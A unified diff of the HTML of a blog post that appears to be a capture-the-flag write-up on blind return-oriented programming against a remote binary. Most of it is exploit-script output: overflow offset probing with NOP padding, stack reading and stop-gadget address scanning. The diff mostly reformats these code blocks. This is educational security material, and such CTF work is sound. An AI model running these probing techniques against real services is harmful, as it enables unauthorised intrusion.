+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x05\x1e\xfc\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9a\xfe\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfd\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe0\xa8\x8bn\xfd\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7f\xc6\xd8\xfe\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcd\n\xfd\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x97\xfd\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xfe\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x7fBye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xcc\x06@Bye!\n'
+[*] sending: b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
+[*] recv: b'Hello you.\nWhat is your name ?\n&gt;&gt;&gt; '
+40
+</code></pre><p>So now we know that we need 40 bytes of padding before the crash.</p>
 <div class="gblog-post__anchorwrap">
     <h3 id="stack-reading">
         Stack reading
@@ -211,28 +211,28 @@ So, no source code is provided, we juste have a netcat to which we can interact.
 
 <span class="n">leak2</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
 </code></pre></div><p>Which returns:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
-<span class="o">[</span>0x5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
-<span class="o">[</span>0x605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
-<span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
-<span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
-<span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
-<span class="o">[</span>0x1a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
-<span class="o">[</span>0x61a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
-<span class="o">[</span>0x40061a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
-<span class="o">[</span>0x40061a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
-<span class="o">[</span>0x1b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
-<span class="o">[</span>0x61b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
-<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
-<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
-<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
-<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
-<span class="o">[</span>0x1d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
-<span class="o">[</span>0x61d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
-<span class="o">[</span>0x40061d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
-<span class="o">[</span>0x40061d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
-STOP: &lt;class <span class="s1">&#39;KeyboardInterrupt&#39;</span>&gt;
-</code></pre></div><p>I stopped the script because it&rsquo;s very long, it&rsquo;s interesting to see that it seems to overwrite directly the return address, which means there is no canary. Morevever according to the addresses of the valid gadgets we found, the binary is not PIE based and it sounds to be a x86 binary.</p>
+<pre tabindex="0"><code>$ ./solve.py
+[0x5] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
+[0x605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
+[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
+[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
+[0x400605] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@'
+[0x1a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
+[0x61a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
+[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
+[0x40061a] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@'
+[0x1b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
+[0x61b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
+[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
+[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
+[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
+[0x40061b] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@'
+[0x1d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
+[0x61d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
+[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
+[0x40061d] Output: b'Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@'
+STOP: &lt;class 'KeyboardInterrupt'&gt;
+</code></pre><p>I stopped the script because it&rsquo;s very long by it&rsquo;s already interesting to see that it seems we overwrite directly the return address, which means there is no canary. Morevever according to the addresses of the valid gadgets we found, the binary is not PIE based and it sounds to be a x86 binary.</p>
 <div class="gblog-post__anchorwrap">
     <h3 id="stop-gadget">
         Stop gadget
@@ -271,90 +271,90 @@ STOP: &lt;class <span class="s1">&#39;KeyboardInterrupt&#39;</span>&gt;
 
 <span class="n">leak2</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
 </code></pre></div><p>Which prints:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
-<span class="o">[</span>0x4004cc<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x04@&#39;</span>
-<span class="o">[</span>0x4004cd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x04@&#39;</span>
-<span class="o">[</span>0x4004dd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x04@&#39;</span>
-<span class="o">[</span>0x400550<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x05@&#39;</span>
-<span class="o">[</span>0x400560<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400562<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400563<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400565<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaae\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400566<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaf\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400567<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400569<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x40056d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x40056e<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaan\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x40056f<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaao\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400570<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400576<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaav\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400577<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x05@Hello you.\nWhat is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400596<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x05@&#39;</span>
-<span class="o">[</span>0x400597<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x97\x05@&#39;</span>
-<span class="o">[</span>0x40059c<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9c\x05@&#39;</span>
-<span class="o">[</span>0x40059d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x9d\x05@&#39;</span>
-<span class="o">[</span>0x4005a0<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x05@&#39;</span>
-<span class="o">[</span>0x4005a1<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa1\x05@&#39;</span>
-<span class="o">[</span>0x4005a3<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa3\x05@&#39;</span>
-<span class="o">[</span>0x4005a5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa5\x05@&#39;</span>
-<span class="o">[</span>0x4005b4<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb4\x05@&#39;</span>
-<span class="o">[</span>0x4005b7<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb7\x05@&#39;</span>
-<span class="o">[</span>0x4005b8<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb8\x05@&#39;</span>
-<span class="o">[</span>0x4005c0<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0\x05@&#39;</span>
-<span class="o">[</span>0x4005d6<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd6\x05@&#39;</span>
-<span class="o">[</span>0x4005d7<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd7\x05@&#39;</span>
-<span class="o">[</span>0x4005dd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x05@&#39;</span>
-<span class="o">[</span>0x4005de<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\x05@&#39;</span>
-<span class="o">[</span>0x4005e1<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe1\x05@&#39;</span>
-<span class="o">[</span>0x4005e2<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe2\x05@&#39;</span>
-<span class="o">[</span>0x4005e4<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe4\x05@&#39;</span>
-<span class="o">[</span>0x4005e5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe5\x05@&#39;</span>
-<span class="o">[</span>0x4005e7<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe7\x05@&#39;</span>
-<span class="o">[</span>0x4005e8<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe8\x05@&#39;</span>
-<span class="o">[</span>0x4005eb<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xeb\x05@&#39;</span>
-<span class="o">[</span>0x4005ec<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xec\x05@&#39;</span>
-<span class="o">[</span>0x4005ee<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xee\x05@&#39;</span>
-<span class="o">[</span>0x4005ef<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xef\x05@&#39;</span>
-<span class="o">[</span>0x4005f1<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf1\x05@&#39;</span>
-<span class="o">[</span>0x4005f3<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf3\x05@&#39;</span>
-<span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
-<span class="o">[</span>0x400608<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x08\x06@&#39;</span>
-<span class="o">[</span>0x40061a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x06@&#39;</span>
-<span class="o">[</span>0x40061b<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1b\x06@&#39;</span>
-<span class="o">[</span>0x40061d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1d\x06@&#39;</span>
-<span class="o">[</span>0x400622<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;\x06@&#39;</span>
-<span class="o">[</span>0x400650<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaP\x06@&#39;</span>
-<span class="o">[</span>0x400656<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaV\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400657<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaW\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400658<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x40065a<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x40065e<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa^\x06@What is your name ?\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400663<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\x06@\x84(\xad\xfb\n&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x400668<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaah\x06@&gt;&gt;&gt; &#39;</span>
-<span class="o">[</span>0x40066d<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam\x06@\x84(\xad\xfb&#39;</span>
-<span class="o">[</span>0x400672<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaar\x06@\x84(\xad\xfb&#39;</span>
-<span class="o">[</span>0x400677<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaw\x06@&#39;</span>
-<span class="o">[</span>0x400681<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x81\x06@&#39;</span>
